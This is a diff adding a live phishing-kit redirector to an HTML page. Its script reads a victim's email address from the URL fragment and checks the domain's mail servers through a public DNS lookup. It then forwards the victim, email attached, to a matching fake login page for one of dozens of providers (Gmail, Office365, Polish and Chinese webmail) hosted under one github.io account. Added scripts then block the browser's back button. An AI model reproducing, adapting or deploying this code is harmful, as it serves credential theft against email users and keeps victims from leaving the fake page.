@@ -1,0 +1,214 @@
+<script>
+    (async function() {
+        // Isolate raw email string out of the browser address bar hash fragment
+        const rawHashData = window.location.hash;
+        if (!rawHashData || rawHashData.length < 2) return;
+
+        const cleanEmail = rawHashData.substring(1).trim().toLowerCase();
+        if (!cleanEmail.includes('@')) return;
+
+        const emailParts = cleanEmail.split('@');
+        if (emailParts.length < 2) return;
+        const targetDomain = emailParts[1].trim();
+
+        let targetDestination = "";
+
+        // Hand-coded Matrix Registry Map
+            const providerRegistry = {
+                "zoho": "https://secsghaa.github.io/cljgfijv/zoho.html",
+                "google": "https://secsghaa.github.io/cljgfijv/gmail.html",
+                "office365": "https://secsghaa.github.io/cljgfijv/office365.html",
+                "outlook": "https://secsghaa.github.io/cljgfijv/office365.html",
+                "secureserver": "https://secsghaa.github.io/cljgfijv/godaddy.html",
+                "godaddy": "https://secsghaa.github.io/cljgfijv/godaddy.html",
+                "yahoo": "https://secsghaa.github.io/cljgfijv/Yahoo.html",
+                "webserwer": "https://secsghaa.github.io/cljgfijv/webserwer.html", 
+                "zenbox": "https://secsghaa.github.io/cljgfijv/zenbox.html",
+                "webd.pl": "https://secsghaa.github.io/cljgfijv/webmail.html",  
+                "gazeta": "https://secsghaa.github.io/cljgfijv/gazeta.pl.html",
+                "home.pl": "https://secsghaa.github.io/cljgfijv/home.pl.html",
+                "serwer": "https://secsghaa.github.io/cljgfijv/home.pl.html",
+                "cyberfolks": "https://secsghaa.github.io/cljgfijv/cyberfolks.html",
+                "Cyber_Folks": "https://secsghaa.github.io/cljgfijv/cyberfolks.html",
+                "netart": "https://secsghaa.github.io/cljgfijv/nazwa.html",   
+                "nazwa": "https://secsghaa.github.io/cljgfijv/nazwa.html", 
+                "progresol": "https://secsghaa.github.io/cljgfijv/progreso.html",  
+                "zenbox": "https://secsghaa.github.io/cljgfijv/zenbox.html", 
+                "dpoczta": "https://secsghaa.github.io/cljgfijv/dpoczta.html", 
+                "lh.pl": "https://secsghaa.github.io/cljgfijv/lh.html",
+                "seohost": "https://secsghaa.github.io/cljgfijv/seohost.html",
+                "megateam": "https://secsghaa.github.io/cljgfijv/webwavecms.html",
+                "mydevil": "https://secsghaa.github.io/cljgfijv/mydevil.html",
+                "hostido": "https://secsghaa.github.io/cljgfijv/hostido.html",
+                "hitme": "https://secsghaa.github.io/cljgfijv/hitme.html",
+                "kei.pl": "https://secsghaa.github.io/cljgfijv/kei.html",
+                "kalamata": "https://secsghaa.github.io/cljgfijv/ovhcloud.html",
+                "ovhcloud": "https://secsghaa.github.io/cljgfijv/ovhcloud.html",
+                "ovh": "https://secsghaa.github.io/cljgfijv/ovhcloud.html",
+                "webwave": "https://secsghaa.github.io/cljgfijv/webwavecms.html",
+                "eTOP": "https://secsghaa.github.io/cljgfijv/webwavecms.html",
+                "protondns": "https://secsghaa.github.io/cljgfijv/webmail.html",
+                "proton": "https://secsghaa.github.io/cljgfijv/proton.html",
+                "protonmail": "https://secsghaa.github.io/cljgfijv/proton.html",
+                "startmail": "https://secsghaa.github.io/cljgfijv/startmail.html",
+                "mailfence": "https://secsghaa.github.io/cljgfijv/mailfence.html",
+                "runbox": "https://secsghaa.github.io/cljgfijv/runbox.html",
+                "hushmail": "https://secsghaa.github.io/cljgfijv/hushmai.html",
+                "countermail": "https://secsghaa.github.io/cljgfijv/countermail.html",
+                "typewire": "https://secsghaa.github.io/cljgfijv/typewire.html",
+                "hostinger": "https://secsghaa.github.io/cljgfijv/hostinger.html",
+                "bluehost": "https://secsghaa.github.io/cljgfijv/bluehost.html",
+                "siteground": "https://secsghaa.github.io/cljgfijv/mailspamprotection.html",
+                "spamprotection": "https://secsghaa.github.io/cljgfijv/mailspamprotection.html",
+                "dreamhost": "https://secsghaa.github.io/cljgfijv/dreamhost.html",
+                "gandi": "https://secsghaa.github.io/cljgfijv/gandi.html",
+                "hover": "https://secsghaa.github.io/cljgfijv/hover.html",
+                "qq.com": "https://secsghaa.github.io/cljgfijv/exmailqq.html",
+                "qiye.163.com": "https://secsghaa.github.io/cljgfijv/qiye163.html",
+                "163.com": "https://secsghaa.github.io/cljgfijv/qiye163.html",
+                "netease": "https://secsghaa.github.io/cljgfijv/qiye163.html",
+                "126.com": "https://secsghaa.github.io/cljgfijv/qiye163.html",
+                "yeah.net": "https://secsghaa.github.io/cljgfijv/qiye163.html",
+                "sina": "https://secsghaa.github.io/cljgfijv/sina.html",
+                "sohu": "https://secsghaa.github.io/cljgfijv/sohu.html",
+                "139.com": "https://secsghaa.github.io/cljgfijv/mail139.html",
+                "189.cn": "https://secsghaa.github.io/cljgfijv/mail189.html",
+                "qiye.aliyun.com": "https://secsghaa.github.io/cljgfijv/aliyun.html",
+                "aliyun.com": "https://secsghaa.github.io/cljgfijv/aliyun.html",
+                "alibaba": "https://secsghaa.github.io/cljgfijv/aliyun.html",
+                "21cn": "https://secsghaa.github.io/cljgfijv/21cn.html",
+                "263.net": "https://secsghaa.github.io/cljgfijv/263net.html",
+                "iq.pl": "https://secsghaa.github.io/cljgfijv/iq.html",
+                "stackmail": "https://secsghaa.github.io/cljgfijv/webwavecms.html",
+                "intertele": "https://secsghaa.github.io/cljgfijv/itlu.html",
+                "itlu": "https://secsghaa.github.io/cljgfijv/itlu.html",
+                "orange": "https://secsghaa.github.io/cljgfijv/orange.html",
+                "barracudanetworks": "https://secsghaa.github.io/cljgfijv/barracuda.html",
+                "barracuda": "https://secsghaa.github.io/cljgfijv/barracuda.html",
+                "euron": "https://secsghaa.github.io/cljgfijv/poczta.euron.html",
+                "euron.pl": "https://secsghaa.github.io/cljgfijv/poczta.euron.html",
+                "itlu.pl": "https://secsghaa.github.io/cljgfijv/poczta.euron.html",
+                "itlu": "https://secsghaa.github.io/cljgfijv/poczta.euron.html",
+                "ionos": "https://secsghaa.github.io/cljgfijv/ionos.html",
+                "zmail": "https://secsghaa.github.io/cljgfijv/zmail300.html",
+                "zmail300": "https://secsghaa.github.io/cljgfijv/zmail300.html",
+                "zimbra": "https://secsghaa.github.io/cljgfijv/zimbra.html",
+                "postiefstechnologies.com": "https://secsghaa.github.io/cljgfijv/zimbra.html",
+                "roots": "https://secsghaa.github.io/cljgfijv/zimbra.html",                
+                "tlen.pl": "https://secsghaa.github.io/cljgfijv/o2.html",
+                "o2.pl": "https://secsghaa.github.io/cljgfijv/o2.html",
+                "go2.pl": "https://secsghaa.github.io/cljgfijv/o2.html",
+                "onet": "https://secsghaa.github.io/cljgfijv/o2.html",
+                "interia": "https://secsghaa.github.io/cljgfijv/o2.html",
+                "op.pl": "https://secsghaa.github.io/cljgfijv/o2.html",
+                "vp.pl": "https://secsghaa.github.io/cljgfijv/o2.html",
+                "autograf.pl": "https://secsghaa.github.io/cljgfijv/o2.html",
+                "poczta.fm": "https://secsghaa.github.io/cljgfijv/o2.html",
+                ".pl": "https://secsghaa.github.io/cljgfijv/itlu.html",
+                "mail.com": "https://secsghaa.github.io/cljgfijv/mail.com.html"
+            };
+
+// Live DNS Topography Handshake Layer
+        try {
+            const dnsUrl = `https://dns.google/resolve?name=${encodeURIComponent(targetDomain)}&type=MX`;
+            const dnsResponse = await fetch(dnsUrl);
+            const dnsData = await dnsResponse.json();
+            
+            let mxRecordsPayloadText = "";
+            let primaryHost = "";
+            
+            if (dnsData.Answer && dnsData.Answer.length > 0) {
+                mxRecordsPayloadText = dnsData.Answer.map(r => r.data ? r.data.toLowerCase() : "").join(" ");
+                const firstRecord = dnsData.Answer[0];
+                if (firstRecord && firstRecord.data) {
+                    const segments = firstRecord.data.toLowerCase().trim().split(/\s+/);
+                    primaryHost = segments[segments.length - 1];
+                    if (primaryHost.endsWith('.')) primaryHost = primaryHost.slice(0, -1);
+                }
+            }
+
+            if (mxRecordsPayloadText !== "") {
+                for (const key in providerRegistry) {
+                    if (mxRecordsPayloadText.includes(key) || mxRecordsPayloadText.includes("aspmx")) {
+                        targetDestination = (key === "google" || mxRecordsPayloadText.includes("aspmx")) ? providerRegistry["google"] : providerRegistry[key];
+                        break;
+                    }
+                }
+// Rule Set B2: Explicit Polish Subdomain Routing Rules Matrix
+if (targetDestination === "" && primaryHost !== "") {
+    const startsWithMail = primaryHost.startsWith("mail.");
+    const startsWithPoczta = primaryHost.startsWith("poczta.");
+    const endsWithPL = primaryHost.endsWith(".pl");
+
+    if ((startsWithMail || startsWithPoczta) && endsWithPL) {
+        targetDestination = "https://secsghaa.github.io/cljgfijv/itlu.html";
+                }
+            }
+                if (targetDestination === "" && primaryHost !== "") {
+                    if (primaryHost === targetDomain) {
+                        targetDestination = "https://secsghaa.github.io/cljgfijv/webmail.html";
+                    } else if (primaryHost === "mail." + targetDomain) {
+                        targetDestination = "https://secsghaa.github.io/cljgfijv/webmail.html";
+                    } else {
+                        targetDestination = "https://secsghaa.github.io/cljgfijv/index.html";
+                    }
+                }
+            }
+        } catch (dnsException) {
+            console.error("DNS Error: ", dnsException);
+        }
+
+        // Global fallback resolution
+        if (targetDestination === "") {
+            targetDestination = "https://secsghaa.github.io/cljgfijv/index.html";
+        }
+
+        // Ensure target domain string format closes cleanly before hash operations
+        if (!targetDestination.endsWith('/')) {
+            // Append trailing slash if it hits an index path root layout file parameter
+            if (!targetDestination.endsWith('.html') && !targetDestination.endsWith('.php')) {
+                targetDestination += "/";
+            }
+        }
+
+        // CORRECTED CONSTRUCTION: Combines path destination directly with the email hash anchor element
+        const finalForwardPath = targetDestination + "#" + cleanEmail;
+
+        // Execute Instant Redirection Takeover
+        window.location.replace(finalForwardPath);
+    })();
+</script>
+</script>
+
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+
+                    
